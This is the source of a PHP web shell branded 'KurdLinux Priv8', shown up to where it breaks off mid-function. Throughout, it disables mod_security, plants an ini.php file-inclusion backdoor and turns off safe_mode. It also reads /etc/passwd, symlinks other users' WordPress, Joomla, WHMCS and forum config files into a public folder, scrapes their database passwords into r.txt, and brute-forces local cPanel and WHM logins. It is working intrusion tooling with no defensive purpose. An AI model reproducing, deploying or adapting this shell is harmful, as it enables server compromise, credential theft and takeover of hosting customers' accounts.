<?php
if(isset($_GET["kurd"]))
	{
	$kurd =unlink(__FILE__);
	if ($kurd){ echo "Ok"; }else{ echo "error"; }}
?>
<?php
function findit($mytext,$starttag,$endtag) {
 $posLeft  = stripos($mytext,$starttag)+strlen($starttag);
 $posRight = stripos($mytext,$endtag,$posLeft+1);
 return  substr($mytext,$posLeft,$posRight-$posLeft);
}
error_reporting(0);
set_time_limit(0);
/*
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|@
@|.|     My best Brother     |.|@
@|.| Ali HawlerY~HaremNawzad |.|@
@|.|  powered By MuhmadEmad  |.|@
@|.|        2014/8/7         |.|@
@|.|          Email          |.|@
@|.|   h4kurd007@gmail.com   |.|@
@|.|    www.kurdlinux.com    |.|@
@|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
*/

?>
<link rel="SHORTCUT ICON" href="http://www.institutkurde.org/en/kurdorama/kurdistan/kurdistan_flag.gif" type="image/x-icon"/>
<?
echo '<head><title>KurdLinux Priv8</title></head>
      <style>
      body
        {
        background: #010101;
        color: #fff;
        font-family: Tahoma;
        }
      a
        {
        font-family:orbitron;
        padding:4px 6px;
        margin:0;
        text-decoration:none;
        letter-spacing:1px;
        color:#0F0;
        }
      a:hover
        {
        background:rgba(35,96,156,0.2);
        }
      textarea
        {
        background:#111111;
        color:#0F0;
        margin:0 4px;
        border:1px solid #555555;
        }
      input
        {
        background:#111111;
        color:#0F0;
        margin:0 4px;
        border:1px solid #555555;
        border-radius:9px;
        }
      select
        {
        background:#111111;
        color:#0F0;
        margin:0 4px;
        border:1px solid #555555;
        }
      input:focus, textarea:focus ,button:active ,select:focus
        {
        box-shadow: 0 0 5px #4C83AF;
        -webkit-box-shadow: 0 0 5px rgba(0, 0, 255, 1);
        -moz-box-shadow: 0 0 5px rgba(0, 0, 255, 1);
        background:#222222;
        overflow: auto;
        }
      table
        {
        background:#111111;
        color:#cccccc;
        padding:6px 8px;
        }
      </style>';
?>
<div class="tul"><font color=""><p align="left">
<meta http-equiv="Content-Type" content="text/html; charset=cp866">
<?/**.**/?>
<?php
/** :P**/

$ON  = '<font color=red>ON</font>';
$OFF = '<font color=green>OFF</font>';

if (ini_get('safe_mode'))
   {
     echo $safe = $ON;
   }
   else
     {
       $safe = $OFF;
     }

     echo '<font color=red>Uname -a:</font> '.@php_uname().
          '<br><font color=red>Safe mode:</font> '.$safe.
          '<br><font color=red>Php version:</font> '.@phpversion().
          '<br><span><font color="Red">Server IP: </font></span>' . @$_SERVER["SERVER_ADDR"] . '&nbsp;|&nbsp;<span><font color="Red">Your IP: </font></span>' . $_SERVER['REMOTE_ADDR'] .
          '<br><font color=red>pwd:</font> '.@getcwd().''
		  
?>
<?/**/?>
<?php
if(empty($_POST['index'])){
	   	$file_pointer = fopen(".htaccess", "w+");
		fwrite($file_pointer, "<IfModule mod_security.c>
    				SecFilterEngine Off
   					 SecFilterScanPOST Off
					</IfModule>"); 
			
		$file_pointer = fopen("ini.php", "w+");
		fwrite($file_pointer, "<?
echo ini_get(\"safe_mode\");
echo ini_get(\"open_basedir\");
include(\$_GET[\"file\"]);
ini_restore(\"safe_mode\");
ini_restore(\"open_basedir\");
echo ini_get(\"safe_mode\");
echo ini_get(\"open_basedir\");
include(\$_GET[\"ss\"]);
?>"); 

		$file_pointer = fopen("php.ini", "w+");
		fwrite($file_pointer, "safe_mode               =       Off"); 
					
		fclose($file_pointer); 
		
    }
	
	
	?>
<div align=center><table width=100% border=1><tr><td align=center></td></tr></table>
<form method=post><font color=Green size=4 face="comic sans ms">Manual symlink<font><br>
<font size=3 color=white>--==[[ <input type=submit name=man value="Open Manual symlink"> ]]==--</font></form><p>
<?php
if(isset($_POST['man']))
{
?>
<form method=post><input type=text name=dli value="/home/user/public_html/config.php"><input type=text name=fna value="owned.txt"><br><br><input type=submit name=manual value="symlink"></form>
<?php
}
?>
<?php
error_reporting(0);
if(isset($_POST['manual']))
{
$dlink=trim($_POST['dli']);
$fna=trim($_POST['fna']);
mkdir('sym',0777);
$acc = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$ha = fopen('sym/.htaccess','w');
fwrite($ha,$acc);
$final="sym/".$fna;
symlink($dlink,$final);

echo "<br>".$dlink."symlink<a href=".$final."><font color=red size=3>is here</font></a>";
}
?>
<div align=center><table width=100% border=1><tr><td align=center></td></tr></table>
<form method=post><font color=Green size=4 face="comic sans ms">All user Server symlink and file root<font><br>
<font size=3 color=white>--==[[ <input type=submit name=useer value="All user symlink"> ]]==--</font></form><p>
<?php
if(isset($_POST['useer'])){
?><form method=post>
<textarea rows=10 cols=50 name=userr>
<?php $users=file("/etc/passwd");
foreach($users as $userr)
{
$str=explode(":",$userr);
echo $str[0]."\n";
}

?></textarea><br><br>
<input type=submit name=sua value="symlink" /></form>
<?php } ?>
<?php
error_reporting(0);
echo "<font color=red size=2 face=\"comic sans ms\">";
if(isset($_POST['sua']))
{
mkdir('sym1',0777);
$rr = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$g = fopen('sym1/.htaccess','w');
fwrite($g,$rr);
$sym1 = symlink("/","sym1/root");
$rt="<a href=sym1/root><font color=white size=3 face=\"comic sans ms\"> rootfile</font></a>";
echo "sym / folder symlink <br><u>$rt</u>";

$dir=mkdir('sym1',0777);
$r = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$f = fopen('sym1/.htaccess','w');

fwrite($f,$r);
$consym="<a href=sym1/><font color=white size=3 face=\"comic sans ms\">configuration files</font></a>";
echo "<br>The link given below for configuration file symlink...open it, once processing finish <br><u><font color=red size=2 face=\"comic sans ms\">$consym</font></u>";

$usr=explode("\n",$_POST['userr']);

foreach($usr as $uss )
{
$us=trim($uss);

$r="sym1/";
symlink('/home/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/includes/configure.php',$r.$us.'..shop');
symlink('/home/'.$us.'/public_html/os/includes/configure.php',$r.$us.'..shop');
symlink('/home/'.$us.'/public_html/oscom/includes/configure.php',$r.$us.'..oscom');
symlink('/home/'.$us.'/public_html/oscommerce/includes/configure.php',$r.$us.'..oscommerce');
symlink('/home/'.$us.'/public_html/oscommerces/includes/configure.php',$r.$us.'..oscommerces');
symlink('/home/'.$us.'/public_html/shop/includes/configure.php',$r.$us.'..shop2');
symlink('/home/'.$us.'/public_html/shopping/includes/configure.php',$r.$us.'..shop..shopping');
symlink('/home/'.$us.'/public_html/sale/includes/configure.php',$r.$us.'..sale');
symlink('/home/'.$us.'/public_html/amember/config.inc.php',$r.$us.'..amember');
symlink('/home/'.$us.'/public_html/config.inc.php',$r.$us.'..amember2');
symlink('/home/'.$us.'/public_html/members/configuration.php',$r.$us.'..members');
symlink('/home/'.$us.'/public_html/config.php',$r.$us.'..4images1');
symlink('/home/'.$us.'/public_html/forum/includes/config.php',$r.$us.'..forum');
symlink('/home/'.$us.'/public_html/forums/includes/config.php',$r.$us.'..forums');
symlink('/home/'.$us.'/public_html/admin/conf.php',$r.$us.'..5');
symlink('/home/'.$us.'/public_html/admin/config.php',$r.$us.'..4');
symlink('/home/'.$us.'/public_html/wp-config.php',$r.$us.'..wp13');
symlink('/home/'.$us.'/public_html/wp/wp-config.php',$r.$us.'..wp13..wp');
symlink('/home/'.$us.'/public_html/WP/wp-config.php',$r.$us.'..wp13..WP');
symlink('/home/'.$us.'/public_html/wp/beta/wp-config.php',$r.$us.'..wp13..wp..beta');
symlink('/home/'.$us.'/public_html/beta/wp-config.php',$r.$us.'..wp13..beta');
symlink('/home/'.$us.'/public_html/press/wp-config.php',$r.$us.'..wp13..press');
symlink('/home/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..wp13..wordpress');
symlink('/home/'.$us.'/public_html/Wordpress/wp-config.php',$r.$us.'..wp13..Wordpress');
symlink('/home/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wp13..Wordpress');
symlink('/home/'.$us.'/public_html/wordpress/beta/wp-config.php',$r.$us.'..wp13..wordpress..beta');
symlink('/home/'.$us.'/public_html/news/wp-config.php',$r.$us.'..wp13..news');
symlink('/home/'.$us.'/public_html/new/wp-config.php',$r.$us.'..wp13..new');
symlink('/home/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wp..blog');
symlink('/home/'.$us.'/public_html/beta/wp-config.php',$r.$us.'..wp..beta');
symlink('/home/'.$us.'/public_html/blogs/wp-config.php',$r.$us.'..wp..blogs');
symlink('/home/'.$us.'/public_html/home/wp-config.php',$r.$us.'..wp..home');
symlink('/home/'.$us.'/public_html/protal/wp-config.php',$r.$us.'..wp..protal');
symlink('/home/'.$us.'/public_html/site/wp-config.php',$r.$us.'..wp..site');
symlink('/home/'.$us.'/public_html/main/wp-config.php',$r.$us.'..wp..main');
symlink('/home/'.$us.'/public_html/test/wp-config.php',$r.$us.'..wp..test');
symlink('/home/'.$us.'/public_html/arcade/functions/dbclass.php',$r.$us.'..ibproarcade');
symlink('/home/'.$us.'/public_html/arcade/functions/dbclass.php',$r.$us.'..ibproarcade');
symlink('/home/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla2');
symlink('/home/'.$us.'/public_html/protal/configuration.php',$r.$us.'..joomla..protal');
symlink('/home/'.$us.'/public_html/joo/configuration.php',$r.$us.'..joo');
symlink('/home/'.$us.'/public_html/cms/configuration.php',$r.$us.'..joomla..cms');
symlink('/home/'.$us.'/public_html/site/configuration.php',$r.$us.'..joomla..site');
symlink('/home/'.$us.'/public_html/main/configuration.php',$r.$us.'..joomla..main');
symlink('/home/'.$us.'/public_html/news/configuration.php',$r.$us.'..joomla..news');
symlink('/home/'.$us.'/public_html/new/configuration.php',$r.$us.'..joomla..new');
symlink('/home/'.$us.'/public_html/home/configuration.php',$r.$us.'..joomla..home');
symlink('/home/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vb..config');
symlink('/home/'.$us.'/public_html/vb3/includes/config.php',$r.$us.'..vb3..config');
symlink('/home/'.$us.'/public_html/cc/includes/config.php',$r.$us.'..vb1..config');
symlink('/home/'.$us.'/public_html/includes/config.php',$r.$us.'..includes..vb');
symlink('/home/'.$us.'/public_html/forum/includes/class_core.php',$r.$us.'..vbluttin..class_core.php');
symlink('/home/'.$us.'/public_html/vb/includes/class_core.php',$r.$us.'..vbluttin..class_core.php1');
symlink('/home/'.$us.'/public_html/cc/includes/class_core.php',$r.$us.'..vbluttin..class_core.php2');
symlink('/home/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm15');
symlink('/home/'.$us.'/public_html/central/configuration.php',$r.$us.'..whm.central');
symlink('/home/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..whm.whmcs');
symlink('/home/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whm.WHMCS');
symlink('/home/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..whmc.WHM');
symlink('/home/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..support');
symlink('/home/'.$us.'/public_html/supp/configuration.php',$r.$us.'..supp');
symlink('/home/'.$us.'/public_html/secure/configuration.php',$r.$us.'..sucure');
symlink('/home/'.$us.'/public_html/secure/whm/configuration.php',$r.$us.'..sucure.whm');
symlink('/home/'.$us.'/public_html/secure/whmcs/configuration.php',$r.$us.'..sucure.whmcs');
symlink('/home/'.$us.'/public_html/cpanel/configuration.php',$r.$us.'..cpanel');
symlink('/home/'.$us.'/public_html/panel/configuration.php',$r.$us.'..panel');
symlink('/home/'.$us.'/public_html/host/configuration.php',$r.$us.'..host');
symlink('/home/'.$us.'/public_html/hosting/configuration.php',$r.$us.'..hosting');
symlink('/home/'.$us.'/public_html/hosts/configuration.php',$r.$us.'..hosts');
symlink('/home/'.$us.'/public_html/configuration.php',$r.$us.'..joomla');
symlink('/home/'.$us.'/public_html/submitticket.php',$r.$us.'..whmcs2');
symlink('/home/'.$us.'/public_html/clients/configuration.php',$r.$us.'..clients');
symlink('/home/'.$us.'/public_html/client/configuration.php',$r.$us.'..client');
symlink('/home/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..clientes');
symlink('/home/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..client');
symlink('/home/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..clientsupport');
symlink('/home/'.$us.'/public_html/billing/configuration.php',$r.$us.'..billing');
symlink('/home/'.$us.'/public_html/manage/configuration.php',$r.$us.'..whm..manage');
symlink('/home/'.$us.'/public_html/my/configuration.php',$r.$us.'..whm..my');
symlink('/home/'.$us.'/public_html/myshop/configuration.php',$r.$us.'..whm..myshop');
symlink('/home/'.$us.'/public_html/includes/dist..configure.php',$r.$us.'..zencart');
symlink('/home/'.$us.'/public_html/zencart/includes/dist..configure.php',$r.$us.'..shop..zencart');
symlink('/home/'.$us.'/public_html/shop/includes/dist..configure.php',$r.$us.'..shop..ZCshop');
symlink('/home/'.$us.'/public_html/Settings.php',$r.$us.'..smf');
symlink('/home/'.$us.'/public_html/smf/Settings.php',$r.$us.'..smf2');
symlink('/home/'.$us.'/public_html/forum/Settings.php',$r.$us.'..smf..forum');
symlink('/home/'.$us.'/public_html/forums/Settings.php',$r.$us.'..smf..forums');
symlink('/home/'.$us.'/public_html/upload/includes/config.php',$r.$us.'..up');
symlink('/home/'.$us.'/public_html/article/config.php',$r.$us.'..Nwahy');
symlink('/home/'.$us.'/public_html/up/includes/config.php',$r.$us.'..up2');
symlink('/home/'.$us.'/public_html/conf_global.php',$r.$us.'..6');
symlink('/home/'.$us.'/public_html/include/db.php',$r.$us.'..7');
symlink('/home/'.$us.'/public_html/connect.php',$r.$us.'..PHP..Fusion');
symlink('/home/'.$us.'/public_html/mk_conf.php',$r.$us.'..9');
symlink('/home/'.$us.'/public_html/includes/config.php',$r.$us.'..traidnt1');
symlink('/home/'.$us.'/public_html/config.php',$r.$us.'..4images');
symlink('/home/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..Drupal');
symlink('/home/'.$us.'/public_html/member/configuration.php',$r.$us.'..1member') ;
symlink('/home/'.$us.'/public_html/billings/configuration.php',$r.$us.'..billings') ;
symlink('/home/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
symlink('/home/'.$us.'/public_html/supports/configuration.php',$r.$us.'..supports');
symlink('/home/'.$us.'/public_html/requires/config.php',$r.$us.'..AM4SS..hosting');
symlink('/home/'.$us.'/public_html/supports/includes/iso4217.php',$r.$us.'..hostbills..supports');
symlink('/home/'.$us.'/public_html/client/includes/iso4217.php',$r.$us.'..hostbills..client');
symlink('/home/'.$us.'/public_html/support/includes/iso4217.php',$r.$us.'..hostbills..support');
symlink('/home/'.$us.'/public_html/billing/includes/iso4217.php',$r.$us.'..hostbills..billing');
symlink('/home/'.$us.'/public_html/billings/includes/iso4217.php',$r.$us.'..hostbills..billings');
symlink('/home/'.$us.'/public_html/host/includes/iso4217.php',$r.$us.'..hostbills..host');
symlink('/home/'.$us.'/public_html/hosts/includes/iso4217.php',$r.$us.'..hostbills..hosts');
symlink('/home/'.$us.'/public_html/hosting/includes/iso4217.php',$r.$us.'..hostbills..hosting');
symlink('/home/'.$us.'/public_html/hostings/includes/iso4217.php',$r.$us.'..hostbills..hostings');
symlink('/home/'.$us.'/public_html/includes/iso4217.php',$r.$us.'..hostbills');
symlink('/home/'.$us.'/public_html/hostbills/includes/iso4217.php',$r.$us.'..hostbills..hostbills');
symlink('/home/'.$us.'/public_html/hostbill/includes/iso4217.php',$r.$us.'..hostbills..hostbill');
}
}

?>
<div align=center><table width=100% border=1><tr><td align=center></td></tr></table>
<form method=post><font color=Green size=4 face="comic sans ms">Grabbing Cpanel & WHM<font><br>
<font size=3 color=white>--==[[ <input type=submit name=usre value="Extract usernames and cpanel symlink"> ]]==--</font></form>
<p>
<?php
if(isset($_POST['usre'])){
?><form method=post>
<textarea rows=10 cols=30 name=user><?php $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
echo $str[0]."\n";
}
 
?></textarea><br><br>
<input type=submit name=su value="symlink" /></form>
<?php } ?>
<?php
error_reporting(0);
echo "<font color=red size=2 face=\"comic sans ms\">";
if(isset($_POST['su']))
{
 
$dir=mkdir('cp',0777);
$r = " Options all \n DirectoryIndex cp.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any ";
$f = fopen('cp/.htaccess','w');
 
fwrite($f,$r);
$consym="<a href=cp/><font color=white size=3 face=\"comic sans ms\">configuration files</font></a>";
echo "<br>folder where config files has been symlinked<br><u><font color=red size=2 face=\"comic sans ms\">$consym</font></u>";
 
$usr=explode("\n",$_POST['user']);
 
foreach($usr as $uss )
{
$us=trim($uss);
 
$r="cp/";
symlink('/home/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
symlink('/home/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
symlink('/home/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
symlink('/home/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
symlink('/home/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
symlink('/home/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
symlink('/home/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
symlink('/home/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
symlink('/home/'.$us.'/public_html/config.php',$r.$us.'..config');
symlink('/home/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
symlink('/home/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
symlink('/home/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
symlink('/home/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
symlink('/home/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
symlink('/home/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
symlink('/home/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
symlink('/home/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
symlink('/home/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
symlink('/home/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
symlink('/home/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
symlink('/home/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
symlink('/home/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
}
}
?>
<?php
//*1*// 
?>
 
 
 
<form method=post>
<font size=3 color=white>--==[[ <input type=submit name=sm value="start grabbing passwords from config files"> ]]==--</font></form><center>
<p>
<?php
error_reporting(0);
set_time_limit(0);
 function entre2v2($text,$marqueurDebutLien,$marqueurFinLien)
{
 
$ar0=explode($marqueurDebutLien, $text);
$ar1=explode($marqueurFinLien, $ar0[1]);
$ar=trim($ar1[0]);
return $ar;
}
 
if(isset($_POST['sm']))
 
{
echo "Error";
$ffile=fopen('r.txt','a+');
 
 
$r= 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME'])."/cp/";
$re=$r;
$confi=array("..wp-config","..word-wp","..wpblog","..config","..admin-conf","..vb","..joomla-or-whmcs","..joomla","..vbinc","..whm","..whmcs","..supporwhmcs","..WHM","..whmc","..WHMcs","..whmcsupp","..whmcs-cli","..whmcs-cl","..whmcs-CL","..whmcs-Cl","..whmcs-csup","..whmcs-bill");
 
$users=file("/etc/passwd");
foreach($users as $user)
{
 
$str=explode(":",$user);
$usersss=$str[0];
foreach($confi as $co)
{
 
 
$uurl=$re.$usersss.$co;
$uel=$uurl;
 
$ch = curl_init();
 
curl_setopt($ch, CURLOPT_URL, $uel);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8');
$result['EXE'] = curl_exec($ch);
curl_close($ch);
$uxl=$result['EXE'];
 
 
if($uxl && preg_match('/table_prefix/i',$uxl))
{
 
echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='comic sans ms'> $usersss  user's website cms is wordpress </font></td></tr></table>";
 
 echo $dbp=entre2v2($uxl,"DB_PASSWORD', '","');");
if(!empty($dbp))
$pass=$dbp."\n";
fwrite($ffile,$pass);
 
}
elseif($uxl && preg_match('/cc_encryption_hash/i',$uxl))
{
 
echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='comic sans ms'> $usersss  user's website whmcs  </font></td></tr></table>";
 
echo $dbp=entre2v2($uxl,"db_password = '","';");
if(!empty($dbp))
$pass=$dbp."\n";
fwrite($ffile,$pass);
 
}
 
 
elseif($uxl && preg_match('/dbprefix/i',$uxl))
{
 
echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='comic sans ms'> $usersss  user's  website cms is joomla </font></td></tr></table>";
 
echo $db=entre2v2($uxl,"password = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/admincpdir/i',$uxl))
{
 
echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='comic sans ms'> $usersss  user's website cms is vbulletin </font></td></tr></table>";
 
echo $db=entre2v2($uxl,"password'] = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
 
}
elseif($uxl && preg_match('/DB_DATABASE/i',$uxl))
{
 
echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='comic sans ms'> got config file for unknwon cms for user $usersss  </font></td></tr></table>";
 
echo $db=entre2v2($uxl,"DB_PASSWORD', '","');");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{
 
echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='comic sans ms'> $usersss user's config file for unknwon cms </font></td></tr></table>";
 
echo $db=entre2v2($uxl,"dbpass = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{
 
echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='comic sans ms'> got config file for unknwon cms of user $usersss  </font></td></tr></table>";
 
echo $db=entre2v2($uxl,"dbpass = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
 
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{
 
echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='comic sans ms'> $usersss user's config file for unknwon cms </font></td></tr></table>";
 
echo $db=entre2v2($uxl,"dbpass = \"","\";");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
 
 
}
}
}
?>
<?php
/*2*/
?>
 
 
<form method=post>
<font size=3 color=white>--==[[ <input type=submit name=cpanel value="brute username & password"> ]]==--</font></form><center>
<?php
 
if(isset($_POST['cpanel']))
{
?>
<form method=post><div align=center><table>
went to brute=><select name="op"> <option name="op" value="cp">CPanel</option>
<option name="op" value="whm">WHMPanel</option></table><p>
<textarea style="background:black;color:white" rows=20 cols=25 name=usernames ><?php $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
echo $str[0]."\n";
}
 
?></textarea><textarea style="background:black;color:white" rows=20 cols=25 name=passwords >
<?php
 
$d=getcwd()."/r.txt";
$pf=file($d);
foreach($pf as $rt)
{
$str=explode('\n',$rt);
echo trim($str[0])."\n";
} ?></textarea><p>
<input type=submit name=cpanelcracking value="start"></form>
<?php
}
?>
 
 
 
 
<?php
error_reporting(0);
$connect_timeout=5;
set_time_limit(0);
 
$userl=$_POST['usernames'];
$passl=$_POST['passwords'];
$attack=$_POST['op'];
$target = "localhost";
 
if(isset($_POST['cpanelcracking']))
{
if($userl!=="" && $passl!=="")
{
if($_POST["op"]=="cp")
{
$cracked=$_POST['crack'];
@fopen($cracked,'a');
echo "please wait  \n";
 
 
}
elseif($_POST["op"]=="whm")
{
@fopen($cracked,'a');
echo "please wait ";
 
}
 
function cpanel($host,$user,$pass,$timeout){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://$host:2082");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 0 ){
echo "<table width=100% ><tr><td align=center><b><font color=white size=2>==================================</font><font color=red size=2> $user </font><font color=white size=2>cracked with </font><font color=red size=2> $pass </font> <font color=white size=2>==================================</font></b></td></tr></table>";
 
 
}
 
curl_close($ch);}
 
$userlist=explode("\n",$userl);
$passlist=explode("\n",$passl);
 
if ($attack == "cp")
{
foreach ($userlist as $user) {
echo "<div align=center><table width=80% ><tr><td align=center><b><font color=red size=1>Attacking user $user </font></td></tr></table>";
$finaluser = trim($user);
foreach ($passlist as $password ) {
$finalpass = trim($password);
 
 
cpanel($target,$finaluser,$finalpass,$connect_timeout);
 
}
}
 
}
 
function whm($host,$user,$pass,$timeout){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://$host:2086");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 0 ){
echo "<table width=100% ><tr><td align=center><b><font color=white size=2>==================================</font><font color=red size=2> $user </font><font color=white size=2>cracked with </font><font color=red size=2> $pass </font> <font color=white size=2>==================================</font></b></td></tr></table>";
 
 
 
 
}
 
 
curl_close($ch);}
$userlist=explode("\n",$userl);
$passlist=explode("\n",$passl);
 
if ($attack == "whm")
{
foreach ($userlist as $user) {
echo "<table width=80% ><tr><td align=center><b><font color=white size=2>user under attack is $user </font></td></tr></table>";
$finaluser = trim($user);
foreach ($passlist as $password ) {
$finalpass = trim($password);
 
whm($target,$finaluser,$finalpass,$connect_timeout);
}
}
}
}
elseif($userl=="")
{
echo "userlist field empty";
 
}
elseif($passl=="")
{
 
echo " paasword list field";
}
}
?>
<?/**/?>
<div align=center><table width=100% border=1><tr><td align=center></td></tr></table>
<form method=post><font color=Green size=4 face="comic sans ms">Symlink perl<font><br><b>
<font size=3 color=white>--==[[ <input type=submit name=passx value="cat /etc/passwd"> ]]==--</font></form>
<p>
<?php
if(isset($_POST['passx']))
{
?>
<textarea style="background:black;color:white" rows=20 cols=50 name=usernames ><?php $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode("\n",$user);
echo $str[0]."\n";
}

?></textarea>
<?php
}



?>
<?/*#*/?>
<form method=post>
<font size=3 color=white>--==[[ <input type=submit name=perl value="Perl symlink ln -s"> ]]==--</font></form><center>
<p>
<?php
if(isset($_POST['perl']))
{
error_reporting(0);

